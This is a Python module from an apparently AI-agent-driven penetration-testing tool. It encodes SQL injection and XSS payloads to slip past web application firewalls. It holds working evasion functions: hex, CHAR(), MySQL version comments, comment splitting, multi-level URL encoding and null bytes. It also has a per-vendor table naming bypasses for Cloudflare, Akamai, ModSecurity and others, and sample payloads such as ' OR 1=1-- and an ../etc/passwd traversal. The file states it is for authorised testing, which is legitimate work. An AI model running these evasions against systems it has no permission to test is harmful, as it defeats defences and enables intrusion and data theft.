"""
core/payload_encoder.py

Payload Encoder / Obfuscator
============================
Standalone utility that applies WAF-bypass encoding and obfuscation
techniques to attack payloads.  Used by AgentPayloadDecider to transform
agent-selected payloads before injection.

Design constraints
  - No dependency on agent.py, llm_engine.py, or any other Argus module.
  - Every technique is pure-function: input string -> output string.
  - On any error the original payload is returned unchanged (fail-safe).
  - Techniques are identified by stable string names so the LLM can
    request them by name in its JSON response.

Technique groups
  BASIC URL       : url_encode, double_url_encode, triple_url_encode
  SQL STRUCTURAL  : hex_encode, char_encode, concat_bypass,
                    mysql_version_comment, sql_comment_obfuscation,
                    space_to_comment, newline_bypass, tab_bypass,
                    scientific_notation
  CASE / CASING   : case_randomization
  XSS / HTML      : unicode_encode, html_entity_encode
  MULTI-PURPOSE   : null_byte_insertion, base64_wrapper

Security note
  Only use Argus against targets you own or have written
  authorisation to test.  Argus is for authorised security
  assessment only.
"""

from __future__ import annotations

import base64
import random
import re
import urllib.parse


# ---- Technique registry ------------------------------------------------------
# Maps stable name -> short description shown in the LLM prompt.

_TECHNIQUES: dict[str, str] = {
    # Basic URL encoding
    "url_encode":               "Single URL-encode all non-alphanumeric chars (%XX)",
    "double_url_encode":        "Double URL-encode -- bypass WAFs that decode once before matching",
    "triple_url_encode":        "Triple URL-encode -- bypass WAFs that perform multiple decode passes",
    # SQL structural obfuscation
    "hex_encode":               "Encode payload as SQL hex literal (0x...) -- bypasses quote filters",
    "char_encode":              "Replace string with CHAR(n,n,...) function call -- beats quote-based blacklists",
    "concat_bypass":            "Wrap string literals in CONCAT(0xNN,...) hex fragments -- breaks exact-string matching",
    "mysql_version_comment":    "Wrap SQL keywords in /*!50000 ...*/ version comments -- MySQL executes, WAFs skip",
    "sql_comment_obfuscation":  "Split SQL keywords mid-word with /**/ (UN/**/ION) -- confuses pattern matchers",
    "space_to_comment":         "Replace spaces with /**/ -- one of the most reliable SQLi WAF bypass techniques",
    "newline_bypass":           "Replace spaces with URL-encoded newlines (%0a) -- evades space-based WAF tokenisers",
    "tab_bypass":               "Replace spaces with URL-encoded tabs (%09) -- alternative whitespace bypass",
    "scientific_notation":      "Replace integer literals with scientific notation (1 -> 1e0) -- WAFs miss these",
    # Case manipulation
    "case_randomization":       "Randomly alternate upper/lower case -- defeats case-sensitive WAF keyword matching",
    # XSS / HTML encoding
    "unicode_encode":           "Encode special chars as JS \\uXXXX escapes -- useful in JS string XSS contexts",
    "html_entity_encode":       "Encode HTML special chars as decimal entities (&#60; etc.) -- XSS filter bypass",
    # Multi-purpose
    "null_byte_insertion":      "Insert %00 at a strategic position -- truncates WAF pattern matching",
    "base64_wrapper":           "Wrap payload in SQL FROM_BASE64() call -- bypasses WAFs that don't decode base64",
}


class PayloadEncoder:
    """
    Encodes and obfuscates payloads using a named set of WAF-bypass techniques.

    Usage:
        enc = PayloadEncoder()
        result = enc.encode("' OR 1=1--", "space_to_comment")  # -> "'/**/OR/**/1=1--"
        result = enc.apply_random_evasion("' OR 1=1--", count=2)
        techniques = enc.get_available_techniques()
        tips = enc.get_waf_tips("cloudflare")

    WAF-specific guidance:
        Cloudflare   -> double_url_encode, newline_bypass, mysql_version_comment
        Akamai       -> html_entity_encode, char_encode, tab_bypass
        ModSecurity  -> mysql_version_comment, space_to_comment, case_randomization
        Generic      -> sql_comment_obfuscation, space_to_comment, hex_encode
    """

    # Recommended techniques per WAF brand
    _WAF_TIPS: dict[str, list[str]] = {
        "cloudflare":   ["double_url_encode", "newline_bypass", "mysql_version_comment"],
        "akamai":       ["html_entity_encode", "char_encode", "tab_bypass"],
        "modsecurity":  ["mysql_version_comment", "space_to_comment", "case_randomization"],
        "f5":           ["sql_comment_obfuscation", "char_encode", "newline_bypass"],
        "imperva":      ["double_url_encode", "concat_bypass", "tab_bypass"],
        "aws":          ["html_entity_encode", "hex_encode", "newline_bypass"],
        "generic":      ["sql_comment_obfuscation", "space_to_comment", "hex_encode"],
    }

    # ---- Public API ----------------------------------------------------------

    def encode(self, payload: str, technique: str) -> str:
        """Apply a single named encoding technique. Returns original on unknown/error.

        Args:
            payload (str): The payload string to encode.
            technique (str): One of `_TECHNIQUES`' keys.

        Returns:
            str: The encoded payload, or `payload` unchanged if
            `technique` is unknown or encoding raises.
        """
        if not payload:
            return payload

        dispatch: dict[str, object] = {
            "url_encode":              self._url_encode,
            "double_url_encode":       self._double_url_encode,
            "triple_url_encode":       self._triple_url_encode,
            "hex_encode":              self._hex_encode,
            "char_encode":             self._char_encode,
            "concat_bypass":           self._concat_bypass,
            "mysql_version_comment":   self._mysql_version_comment,
            "sql_comment_obfuscation": self._sql_comment_obfuscation,
            "space_to_comment":        self._space_to_comment,
            "newline_bypass":          self._newline_bypass,
            "tab_bypass":              self._tab_bypass,
            "scientific_notation":     self._scientific_notation,
            "case_randomization":      self._case_randomization,
            "unicode_encode":          self._unicode_encode,
            "html_entity_encode":      self._html_entity_encode,
            "null_byte_insertion":     self._null_byte_insertion,
            "base64_wrapper":          self._base64_wrapper,
        }

        fn = dispatch.get(technique)
        if fn is None:
            return payload  # unknown technique -- fail-safe

        try:
            return fn(payload)
        except Exception:
            return payload  # encoding error -- fail-safe

    def get_available_techniques(self) -> list[str]:
        """Return list of all supported technique name strings."""
        return list(_TECHNIQUES.keys())

    def get_technique_descriptions(self) -> dict[str, str]:
        """Return dict of technique_name -> short description."""
        return dict(_TECHNIQUES)

    def get_waf_tips(self, waf_name: str) -> list[str]:
        """Return recommended technique names for a specific WAF brand.

        Args:
            waf_name (str): A WAF brand name or substring thereof
                (case-insensitive), matched against `_WAF_TIPS`' keys.

        Returns:
            list[str]: The matched brand's recommended technique names,
            or `_WAF_TIPS["generic"]`'s if no brand matched.
        """
        key = waf_name.lower().strip()
        for brand in self._WAF_TIPS:
            if brand in key or key in brand:
                return list(self._WAF_TIPS[brand])
        return list(self._WAF_TIPS["generic"])

    def apply_random_evasion(self, payload: str, count: int = 1) -> str:
        """Apply 'count' randomly chosen techniques in sequence.

        Args:
            payload (str): The payload string to encode.
            count (int): Number of distinct techniques to chain, clamped
                to the number of available techniques.

        Returns:
            str: `payload` unchanged if empty or `count < 1`, else the
            result of applying `count` randomly chosen techniques in
            sequence.
        """
        if not payload or count < 1:
            return payload
        techniques = self.get_available_techniques()
        count = min(count, len(techniques))
        chosen = random.sample(techniques, count)
        result = payload
        for technique in chosen:
            result = self.encode(result, technique)
        return result

    # ---- Basic URL encoding --------------------------------------------------

    def _url_encode(self, payload: str) -> str:
        """Single URL-encode all non-alphanumeric chars. Example: '<script>' -> '%3Cscript%3E'"""
        return urllib.parse.quote(payload, safe="")

    def _double_url_encode(self, payload: str) -> str:
        """Double URL-encode. Effective against Cloudflare WAFs that decode once before matching.
        Example: '<' -> '%3C' -> '%253C'

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: The double-URL-encoded payload.
        """
        single = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(single, safe="")

    def _triple_url_encode(self, payload: str) -> str:
        """Triple URL-encode. Targets WAFs performing multiple decode passes.
        Example: '<' -> '%3C' -> '%253C' -> '%25253C'

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: The triple-URL-encoded payload.
        """
        result = urllib.parse.quote(payload, safe="")
        result = urllib.parse.quote(result, safe="")
        result = urllib.parse.quote(result, safe="")
        return result

    # ---- SQL structural obfuscation ------------------------------------------

    def _hex_encode(self, payload: str) -> str:
        """Encode as SQL hex string literal (0x...). MySQL/MSSQL accept this as a string.
        Example: 'admin' -> 0x61646d696e

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: `0x` followed by the payload's UTF-8 bytes as hex.
        """
        hex_str = payload.encode("utf-8").hex()
        return f"0x{hex_str}"

    def _char_encode(self, payload: str) -> str:
        """Replace every character with CHAR(ascii_val) calls.
        Highly effective against quote-based blacklists and string keyword rules.
        Works in MySQL, MSSQL, Oracle.
        Example: 'OR' -> CHAR(79,82)

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: `CHAR(<comma-separated ordinals>)`.
        """
        char_vals = ",".join(str(ord(c)) for c in payload)
        return f"CHAR({char_vals})"

    def _concat_bypass(self, payload: str) -> str:
        """Wrap payload in CONCAT() using per-char hex fragments.
        Breaks exact-string WAF matching by splitting into individual hex chars.
        Example: 'admin' -> CONCAT(0x61,0x64,0x6d,0x69,0x6e)

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: `CONCAT(<comma-separated per-char hex literals>)`.
        """
        frags = ",".join(f"0x{ord(c):02x}" for c in payload)
        return f"CONCAT({frags})"

    def _mysql_version_comment(self, payload: str) -> str:
        """Wrap SQL keywords in MySQL version-conditional inline comments /*!50000 */.
        MySQL executes; most WAFs (Cloudflare, ModSecurity) treat as comments and skip.
        Example: 'UNION SELECT' -> '/*!50000 UNION*//*!50000 SELECT*/'

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: `payload` with each recognized SQL keyword wrapped in a
            `/*!50000 KEYWORD*/` version-conditional comment.
        """
        keywords = [
            "UNION", "SELECT", "FROM", "WHERE", "AND", "OR",
            "INSERT", "UPDATE", "DELETE", "DROP", "TABLE", "DATABASE",
            "SLEEP", "ORDER", "HAVING", "GROUP", "EXEC", "EXECUTE",
            "CAST", "CONVERT", "CHAR", "ASCII", "CONCAT", "INFORMATION_SCHEMA",
            "BENCHMARK", "LOAD_FILE", "OUTFILE",
        ]
        result = payload
        for kw in keywords:
            result = re.sub(
                rf"(?<![A-Za-z0-9_]){re.escape(kw)}(?![A-Za-z0-9_])",
                f"/*!50000 {kw}*/",
                result,
                flags=re.IGNORECASE,
            )
        return result

    def _sql_comment_obfuscation(self, payload: str) -> str:
        """Split SQL keywords mid-word with /**/ inline comments.
        Less aggressive than mysql_version_comment but works across all DBs.
        Example: 'UNION SELECT' -> 'UN/**/ION SE/**/LECT'

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: `payload` with each recognized SQL keyword split mid-word
            by a `/**/` comment.
        """
        keywords = [
            "UNION", "SELECT", "FROM", "WHERE", "AND", "OR",
            "INSERT", "UPDATE", "DELETE", "DROP", "TABLE", "DATABASE",
            "SLEEP", "ORDER", "HAVING", "GROUP", "EXEC", "EXECUTE",
            "CAST", "CONVERT", "CHAR", "ASCII", "CONCAT",
        ]
        result = payload
        for kw in keywords:
            mid = max(1, len(kw) // 2)
            broken = kw[:mid] + "/**/" + kw[mid:]
            result = re.sub(
                rf"(?<![A-Za-z0-9_]){re.escape(kw)}(?![A-Za-z0-9_])",
                broken,
                result,
                flags=re.IGNORECASE,
            )
        return result

    def _space_to_comment(self, payload: str) -> str:
        """Replace spaces with /**/ inline comments. Database treats /**/ as whitespace.
        Example: 'OR 1=1' -> 'OR/**/1=1'"""
        return payload.replace(" ", "/**/")

    def _newline_bypass(self, payload: str) -> str:
        """Replace spaces with %0a (URL-encoded newline).
        Many WAFs (Cloudflare) tokenise on spaces but not newlines.
        MySQL/PostgreSQL/MSSQL accept newlines as whitespace.
        Example: 'OR 1=1' -> 'OR%0a1=1'"""
        return payload.replace(" ", "%0a")

    def _tab_bypass(self, payload: str) -> str:
        """Replace spaces with %09 (URL-encoded tab).
        Effective against Akamai rule sets that fail to normalise tabs.
        Example: 'OR 1=1' -> 'OR%091=1'"""
        return payload.replace(" ", "%09")

    def _scientific_notation(self, payload: str) -> str:
        """Replace stand-alone integer literals with scientific notation (1 -> 1e0).
        SQL DBs evaluate 1e0 as integer 1; most WAF rules miss scientific notation.
        Example: '1=1' -> '1e0=1e0'"""
        return re.sub(r"(?<![.\w])(\d+)(?![\w.])", r"\1e0", payload)

    # ---- Case manipulation ---------------------------------------------------

    def _case_randomization(self, payload: str) -> str:
        """Randomly alternate upper/lower case per character (50% probability).
        Defeats case-sensitive WAF keyword matching.
        Example: 'SELECT' -> 'sElEcT' (varies per call)"""
        return "".join(
            c.upper() if random.random() >= 0.5 else c.lower()
            for c in payload
        )

    # ---- XSS / HTML encoding ------------------------------------------------

    def _unicode_encode(self, payload: str) -> str:
        """Encode special/non-ASCII chars as JS \\uXXXX escapes.
        Useful for XSS in JavaScript string contexts.
        Example: '<script>' -> '\\u003cscript\\u003e'

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: `payload` with non-ASCII/special chars replaced by
            `\\uXXXX` escapes; everything else unchanged.
        """
        result = ""
        for ch in payload:
            if ord(ch) > 127 or ch in '<>"\'&`\\':
                result += f"\\u{ord(ch):04x}"
            else:
                result += ch
        return result

    def _html_entity_encode(self, payload: str) -> str:
        """Encode HTML special chars as hex HTML entities (&#xNN;).
        Browsers decode entities before HTML parsing; WAFs matching raw chars miss this.
        Effective for XSS on Akamai rule sets.
        Example: '<script>alert(1)</script>' -> '&#x3c;script&#x3e;alert&#x28;1&#x29;...'

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: `payload` with HTML-special characters replaced by
            `&#xNN;` hex entities; everything else unchanged.
        """
        _HTML_CHARS = set('<>"\'/&`=();{}[]')
        result = ""
        for ch in payload:
            if ch in _HTML_CHARS:
                result += f"&#x{ord(ch):02x};"
            else:
                result += ch
        return result

    # ---- Multi-purpose -------------------------------------------------------

    def _null_byte_insertion(self, payload: str) -> str:
        """Insert %00 at a strategic position.
        WAFs/parsers that truncate at null bytes miss the remainder of the payload.
        Inserted before the last '.' if present, otherwise appended.
        Example: '../etc/passwd.php' -> '../etc/passwd%00.php'
        Example: \"' OR 1=1--\" -> \"' OR 1=1--%00\"

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: `payload` with `%00` inserted before the last `.` if
            present, else appended at the end.
        """
        dot_idx = payload.rfind(".")
        if dot_idx != -1:
            return payload[:dot_idx] + "%00" + payload[dot_idx:]
        return payload + "%00"

    def _base64_wrapper(self, payload: str) -> str:
        """Wrap payload in MySQL FROM_BASE64() function call.
        MySQL evaluates this at query time; WAFs that don't decode base64 miss the injection.
        Best for string-value contexts (username/password fields).
        Example: 'admin' -> FROM_BASE64('YWRtaW4=')

        Args:
            payload (str): The payload string to encode.

        Returns:
            str: `FROM_BASE64('<base64 of payload>')`.
        """
        b64 = base64.b64encode(payload.encode("utf-8")).decode("ascii")
        return f"FROM_BASE64('{b64}')"
